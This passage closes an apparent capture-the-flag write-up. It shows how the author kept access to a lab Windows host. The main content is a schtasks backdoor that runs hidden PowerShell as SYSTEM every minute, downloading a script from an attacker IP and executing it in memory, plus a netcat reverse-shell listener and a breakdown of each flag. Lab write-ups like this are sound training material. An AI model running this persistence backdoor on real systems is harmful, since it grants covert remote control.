+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-134155_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We then need to create our scheduled task</strong>:</p>
+<ul>
+<li><code>schtasks /create /tn ScriptCradle /tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.121:8080/script.ps1'''))'&quot; /sc minute /mo 1 /ru System</code></li>
+<li><figure><img src="/ox-hugo/2024-11-05-133749_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Start our listener &amp; webserver</strong>:</p>
+<ul>
+<li>Webserver:
+<ul>
+<li><code>python3 -m http.server [port]</code></li>
+</ul>
+</li>
+<li>Listener:
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 53</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The task grabs our script &amp; immediatley executes it in memory</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-134010_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We get our revere shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-134027_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Double check by disconnecting &amp; seeing if it re-connects and it does</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-134907_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown:</p>
+<ul>
+<li><code>schtasks /create</code>
+<ul>
+<li>Creates a new scheduled task on Windows.</li>
+</ul>
+</li>
+<li><code>/tn ScriptCradle</code>
+<ul>
+<li>Sets the task name to <code>ScriptCradle</code>.</li>
+<li>This name is how the task will appear in the Task Scheduler.</li>
+</ul>
+</li>
+<li><code>/tr &quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe</code>
+<ul>
+<li>Specifies the action that the task will execute.</li>
+<li><code>powershell.exe</code>: Starts PowerShell.</li>
+<li><strong>Arguments passed to powershell</strong>:
+<ul>
+<li><code>-WindowStyle hidden</code>: Runs the task in a hidden window to prevent showing the PowerShell window.</li>
+<li><code>NoLogo -NonInteractive -ep bypass -nop</code>: PowerShell flags to suppress output and allow script execution bypassing restrictions.</li>
+<li><code>IEX ((New-Object Net.WebClient).DownloadString(...))</code>: Uses <code>Invoke-Expression</code> to download and immediately execute the script.</li>
+<li><code>/sc minute /mo 1</code>: Sets the task to run every 1 minute.</li>
+<li><code>/ru System</code>: Runs the task under <code>System</code> privileges.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>This box was great as means to learn about the CVE&rsquo;s in question. However what I enjoyed more was figuring out ways to achieve persistence with such little open on the host. With only port 80 being open creating a consistent means of re-entering the host was interesting to me and a good exercise</li>
+<li>Learning about the CVE&rsquo;s CVE-2023-38146 &amp; CVE-2023-28252 was very interesting.
+<ul>
+<li>There is a great article here about CLFS vulnerability but it&rsquo;s ALOT:
+<ul>
+<li><a href="https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability">https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>I wrote two deep dives to understand these attacks more.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Not a huge amount this time to be honest, which is fun. Might actually be improving.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3318
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 05 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
